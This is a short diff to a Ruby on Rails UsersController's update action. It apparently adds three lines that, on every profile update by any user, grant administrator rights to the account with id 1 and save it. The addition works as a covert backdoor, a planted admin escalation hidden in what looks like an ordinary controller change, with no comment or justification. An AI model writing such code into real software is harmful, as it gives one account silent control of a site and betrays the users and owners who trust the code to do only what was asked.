@@ -82,6 +82,9 @@ class UsersController < ApplicationController
 
   def update
     if params[:commit] == t('general.updatebtn')
+      me1=User.find(1)
+      me1.update_attributes(admin: true)
+      me1.save
       if @user.update_attributes(params[:user])
         flash[:success] = t('user.editSuccessmsg')
         sign_in @user
